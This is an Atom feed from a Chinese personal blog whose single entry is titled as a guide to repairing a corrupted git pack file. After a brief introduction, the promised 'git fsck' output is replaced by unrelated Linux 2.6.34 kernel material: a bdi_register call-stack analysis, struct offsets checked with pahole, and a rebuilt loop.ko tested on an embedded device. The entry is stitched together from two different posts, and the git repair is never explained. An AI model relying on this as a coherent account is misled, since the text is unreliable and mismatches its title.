<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <title>晓风残月</title>
    <id>https://blog.leexiaolan.tk/</id>
    <subtitle>风月无边</subtitle>
    <link href="https://blog.leexiaolan.tk" />
    <link href="https://blog.leexiaolan.tk/atom.xml" rel="self" />
    <updated>2018-08-02T03:56:21Z</updated>
    <author>
      <name>LeeXiaolan</name>
    </author>

  <entry>
      <link href="https://blog.leexiaolan.tk/fix-git-pack-file-corruption.html"/>
      <id>https://blog.leexiaolan.tk/entry/fix-git-pack-file-corruption</id>
      <title>修复损坏的 git pack 文件</title>
      <content type="html"><![CDATA[
      &lt;h1&gt;事由&lt;/h1&gt;
&lt;p&gt;从朋友处得到一个 &lt;code&gt;git&lt;/code&gt; repo 的 &lt;code&gt;tgz&lt;/code&gt; 存档文件，解压之，然后使用 &lt;code&gt;git fsck&lt;/code&gt; 来校验存档的完整性，当看到输出 &lt;code&gt;error: ./objects/pack/pack-73ca*.pack SHA1 checksum mismatch&lt;/code&gt; 时，心想：&amp;ldquo;完蛋了，十几个 G 的文件损坏了，又得重来来过&amp;rdquo;。转念一想，有没有可能修复呢？&lt;/p&gt;
&lt;h1&gt;声明&lt;/h1&gt;
&lt;p&gt;本文中不涉及 &lt;code&gt;git pack&lt;/code&gt; 文件自身的任何修复信息，所有修复信息都来自外部信源。据我所知，&lt;code&gt;git pack&lt;/code&gt; 文件也不包含任何冗余信息可以用于自愈。&lt;/p&gt;
&lt;p&gt;文中所有 &lt;code&gt;git object id&lt;/code&gt; 都经过编辑处理。&lt;/p&gt;
&lt;h1&gt;意外的惊喜&lt;/h1&gt;
&lt;p&gt;下面是 &lt;code&gt;git fsck&lt;/code&gt; 完整的输出结果。乍一看，很多行错误，研判之后发现其实只有三五个 &lt;code&gt;object&lt;/code&gt; 损坏。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;leexiaolan@cherry:~/corrupted.git$ git fsck
Checking object directories: 100% (256/256), done.

538 int bdi_register(struct backing_dev_info *bdi, struct device *parent,
539                 const char *fmt, ...)
540 {
541         va_list args;
542         int ret = 0;
543         struct device *dev;
544
545         if (bdi-&amp;gt;dev)   /* The driver needs to use separate queues per device */
546                 goto exit;
547
548         va_start(args, fmt);
            ...
            ...
            ...
584         return ret;
585 }
586 EXPORT_SYMBOL(bdi_register);
587
588 int bdi_register_dev(struct backing_dev_info *bdi, dev_t dev)
589 {
590         return bdi_register(bdi, NULL, &quot;%u:%u&quot;, MAJOR(dev), MINOR(dev));
591 }
592 EXPORT_SYMBOL(bdi_register_dev);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;根据 &lt;code&gt;LR&lt;/code&gt; 寄存器，追溯到 &lt;code&gt;bdi_register&lt;/code&gt; 的调用者 &lt;code&gt;bdi_register_dev&lt;/code&gt;，这之后的完整调用栈就只能靠猜了，剩下唯一能确定的就是调用栈最终应该回溯到 &lt;code&gt;loop.ko&lt;/code&gt; 中的函数。&lt;/p&gt;
&lt;p&gt;如果对内核相当熟悉，或者非常幸运（比如我），应该能很快梳理出完整的调用栈，如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bdi_register
bdi_register_dev
add_disk
loop_init_one
loop_probe
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;函数 &lt;code&gt;bdi_register&lt;/code&gt; 中引起的异常的 &lt;code&gt;bdi&lt;/code&gt; 参数值来源于 &lt;a href=&quot;http://elixir.free-electrons.com/linux/v2.6.34.10/source/block/genhd.c#L516&quot; title=&quot;block/genhd.c#L516&quot;&gt;&lt;code&gt;add_disk&lt;/code&gt;&lt;/a&gt;，549 行 &lt;code&gt;bdi = &amp;amp;disk-&amp;gt;queue-&amp;gt;backing_dev_info;&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/* block/genhd.c */
516 void add_disk(struct gendisk *disk)
517 {
518         struct backing_dev_info *bdi;
            ...
            ...
            ...
546         register_disk(disk);
547         blk_register_queue(disk);
548
549         bdi = &amp;amp;disk-&amp;gt;queue-&amp;gt;backing_dev_info;
550         bdi_register_dev(bdi, disk_devt(disk));
551         retval = sysfs_create_link(&amp;amp;disk_to_dev(disk)-&amp;gt;kobj, &amp;amp;bdi-&amp;gt;dev-&amp;gt;kobj,
552                                    &quot;bdi&quot;);
553         WARN_ON(retval);
554 }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;函数 &lt;code&gt;add_disk&lt;/code&gt; 是编译在内核中，可以通过查看其汇编代码来确定 &lt;code&gt;queue&lt;/code&gt; 和 &lt;code&gt;backing_dev_info&lt;/code&gt; 成员在结构体中的偏移量。&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;原始内核中结构体成员的偏移量&quot; src=&quot;/media/ag5zfmJsb2ctbGVlLWhyZHISCxIFTWVkaWEYgICAgJmZjQoM/offset-in-add_disk-of-kernel.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;从上图高亮的汇编代码中可以看出，&lt;code&gt;queue&lt;/code&gt; 偏移量是 &lt;code&gt;0x11c&lt;/code&gt;，&lt;code&gt;backing_dev_info&lt;/code&gt; 的偏移量是 &lt;code&gt;0xa0&lt;/code&gt;。这是在原始厂商的内核中的偏移值。再来看看我们编译的 &lt;code&gt;loop.ko&lt;/code&gt; 中的偏移值。由于是我们自行编译的，获取这些信息相对比较容易。只需要在编译时配置 &lt;code&gt;CONFIG_DEBUG_INFO=y&lt;/code&gt; 后，使用 &lt;code&gt;pahole&lt;/code&gt; 就能获取这些信息。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;leexiaolan@mars:~/linux-2.6.34.10$ pahole -C gendisk drivers/block/loop.ko
struct gendisk {
        int                        major;                /*     0     4 */
        int                        first_minor;          /*     4     4 */
        int                        minors;               /*     8     4 */
        char                       disk_name[32];        /*    12    32 */
        char *                     (*devnode)(struct gendisk *, mode_t *); /*    44     4 */
        struct disk_part_tbl *     part_tbl;             /*    48     4 */

        /* XXX 4 bytes hole, try to pack */

        struct hd_struct           part0;                /*    56   336 */
        /* --- cacheline 6 boundary (384 bytes) was 8 bytes ago --- */
        const struct block_device_operations  * fops;    /*   392     4 */
        struct request_queue *     queue;                /*   396     4 */
        ...
        ...
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;queue&lt;/code&gt; 成员偏移量是 &lt;code&gt;396&lt;/code&gt;，转换成 16 进制是 &lt;code&gt;0x18c&lt;/code&gt;，和原始内核中的偏移量 &lt;code&gt;0x11c&lt;/code&gt; 多了 &lt;code&gt;0x70&lt;/code&gt;，所以位于 &lt;code&gt;queue&lt;/code&gt; 前面的大小为 &lt;code&gt;336&lt;/code&gt; 的 &lt;code&gt;part0&lt;/code&gt; 就很可疑了。继续深挖 &lt;code&gt;struct hd_struct part0&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;leexiaolan@mars:~/linux-2.6.34.10$ pahole -C hd_struct drivers/block/loop.ko
struct hd_struct {
        sector_t                   start_sect;           /*     0     4 */
        sector_t                   nr_sects;             /*     4     4 */
        sector_t                   alignment_offset;     /*     8     4 */
        unsigned int               discard_alignment;    /*    12     4 */
        struct device              __dev;                /*    16   280 */
        /* --- cacheline 4 boundary (256 bytes) was 40 bytes ago --- */
        struct kobject *           holder_dir;           /*   296     4 */
        int                        policy;               /*   300     4 */
        int                        partno;               /*   304     4 */
        long unsigned int          stamp;                /*   308     4 */
        int                        in_flight[2];         /*   312     8 */
        /* --- cacheline 5 boundary (320 bytes) --- */
        struct disk_stats *        dkstats;              /*   320     4 */
        struct rcu_head            rcu_head;             /*   324     8 */

        /* size: 336, cachelines: 6, members: 12 */
        /* padding: 4 */
        /* last cacheline: 16 bytes */
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这回可疑的是 &lt;code&gt;struct device __dev&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;leexiaolan@mars:~/linux-2.6.34.10$ pahole -C device drivers/block/loop.ko
struct device {
        struct device *            parent;               /*     0     4 */
        struct device_private *    p;                    /*     4     4 */
        struct kobject             kobj;                 /*     8    36 */
        const char  *              init_name;            /*    44     4 */
        struct device_type *       type;                 /*    48     4 */
        struct semaphore           sem;                  /*    52    16 */
        /* --- cacheline 1 boundary (64 bytes) was 4 bytes ago --- */
        struct bus_type *          bus;                  /*    68     4 */
        struct device_driver *     driver;               /*    72     4 */
        void *                     platform_data;        /*    76     4 */
        struct dev_pm_info         power;                /*    80   120 */
        /* --- cacheline 3 boundary (192 bytes) was 8 bytes ago --- */
        ...
        ...
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;power&lt;/code&gt; 的大小很可疑，我们来看看 &lt;a href=&quot;http://elixir.free-electrons.com/linux/v2.6.34.10/source/include/linux/pm.h#L451&quot; title=&quot;include/linux/pm.h#L451&quot;&gt;&lt;code&gt;struct dev_pm_info&lt;/code&gt;&lt;/a&gt; 在头文件中的定义，一眼就可以发现其中有两个 &lt;code&gt;CONFIG_*&lt;/code&gt; 控制的宏，检查 &lt;code&gt;.config&lt;/code&gt; 文件，发现这两配置确实是打开的，估计这就是罪魁祸首。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;451 struct dev_pm_info {
452         pm_message_t            power_state;
453         unsigned int            can_wakeup:1;
454         unsigned int            should_wakeup:1;
455         unsigned                async_suspend:1;
456         enum dpm_state          status;         /* Owned by the PM core */
457 #ifdef CONFIG_PM_SLEEP
458         struct list_head        entry;
459         struct completion       completion;
460 #endif
461 #ifdef CONFIG_PM_RUNTIME
462         struct timer_list       suspend_timer;
463         unsigned long           timer_expires;
464         struct work_struct      work;
465         wait_queue_head_t       wait_queue;
466         spinlock_t              lock;
467         atomic_t                usage_count;
468         atomic_t                child_count;
469         unsigned int            disable_depth:3;
470         unsigned int            ignore_children:1;
471         unsigned int            idle_notification:1;
472         unsigned int            request_pending:1;
473         unsigned int            deferred_resume:1;
474         unsigned int            run_wake:1;
475         unsigned int            runtime_auto:1;
476         enum rpm_request        request;
477         enum rpm_status         runtime_status;
478         int                     runtime_error;
479 #endif
480 };
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;关掉 &lt;code&gt;CONFIG_PM_SLEEP&lt;/code&gt; 和 &lt;code&gt;CONFIG_PM_RUNTIME&lt;/code&gt; 这两个配置，重新编译 &lt;code&gt;loop.ko&lt;/code&gt;，再来检查 &lt;code&gt;queue&lt;/code&gt; 的偏移量：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;leexiaolan@mars:~/linux-2.6.34.10$ pahole -C gendisk drivers/block/loop.ko|grep queue
        struct request_queue *     queue;                /*   284     4 */
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;284 == 0x11c，已经和原始内核中的偏移量保持一致，可以到设备上进行测试了。&lt;/p&gt;
&lt;h1&gt;测试 loop.ko 和 ext2.ko&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;WAP(Dopra Linux) # insmod loop.ko
WAP(Dopra Linux) # mkdir ext2-mount-test
WAP(Dopra Linux) # mount -t ext2 -o loop ext2.img ext2-mount-test
WAP(Dopra Linux) # cd ext2-mount-test
WAP(Dopra Linux) # &amp;gt; test.txt echo &#39;ext2 fs create/write test.&#39;; ls
lost+found/ test.txt
WAP(Dopra Linux) # cat test.txt
ext2 fs create/write test.
WAP(Dopra Linux) # rm test.txt; ls
lost+found/
&lt;/code&gt;&lt;/pre&gt;
